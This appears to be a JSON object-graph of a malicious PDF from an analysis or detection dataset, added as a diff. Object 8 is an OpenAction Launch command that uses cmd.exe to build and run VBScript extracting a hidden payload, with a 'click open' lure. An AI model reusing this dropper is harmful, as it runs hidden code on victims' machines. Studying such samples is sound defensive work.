@@ -1,0 +1,61 @@
+{
+    "1": {
+        "insn_list": [
+            "<<\n  /Type /Catalog\n  /Outlines 2 0 R\n  /Pages 3 0 R\n  /OpenAction 8 0 R\n>>"
+        ],
+        "out_edge_list": [
+            2,
+            3,
+            8
+        ]
+    },
+    "2": {
+        "insn_list": [
+            "<<\n  /Type /Outlines\n  /Count 0\n>>"
+        ],
+        "out_edge_list": []
+    },
+    "3": {
+        "insn_list": [
+            "<<\n  /Type /Pages\n  /Kids [ 4 0 R ]\n  /Count 1\n>>"
+        ],
+        "out_edge_list": [
+            4
+        ]
+    },
+    "4": {
+        "insn_list": [
+            "<<\n  /Type /Page\n  /Parent 3 0 R\n  /MediaBox [ 0 0 612 792 ]\n  /Contents 5 0 R\n  /Resources <<\n    /ProcSet 6 0 R\n    /Font <<\n      /F1 7 0 R\n    >>\n  >>\n>>"
+        ],
+        "out_edge_list": [
+            3,
+            5,
+            6,
+            7
+        ]
+    },
+    "5": {
+        "insn_list": [
+            "<<\n  /Length 248960\n>>"
+        ],
+        "out_edge_list": []
+    },
+    "6": {
+        "insn_list": [
+            "[ /PDF /Text ]"
+        ],
+        "out_edge_list": []
+    },
+    "7": {
+        "insn_list": [
+            "<<\n  /Type /Font\n  /Subtype /Type1\n  /Name /F1\n  /BaseFont /Helvetica\n  /Encoding /MacRomanEncoding\n>>"
+        ],
+        "out_edge_list": []
+    },
+    "8": {
+        "insn_list": [
+            "<<\n  /Type /Action\n  /S /Launch\n  /Win <<\n    /F (cmd.exe)\n    /P (/c echo Set fso=CreateObject\\(\"Scripting.FileSystemObject\"\\) > script.vbs && echo Set f=fso.OpenTextFile\\(\"doc.pdf\", 1, True\\) >> script.vbs && echo pf=f.ReadAll  >> script.vbs && echo s=InStr\\(pf,\"'SS\"\\)  >> script.vbs && echo e=InStr\\(pf,\"'EE\"\\)  >> script.vbs && echo s=Mid\\(pf,s,e-s\\)  >> script.vbs && echo Set z=fso.OpenTextFile\\(\"batscript.vbs\", 2, True\\)  >> script.vbs && echo s = Replace\\(s,\"%\",\"\"\\) >> script.vbs && echo z.Write\\(s\\) >> script.vbs && script.vbs && batscript.vbs\\r\\n\\r\\n\\r\\n\\r\\n\\r\\n\\r\\n\\r\\n\\r\\nClick the \"open\" button to view this document:)\n  >>\n>>"
+        ],
+        "out_edge_list": []
+    }
+}
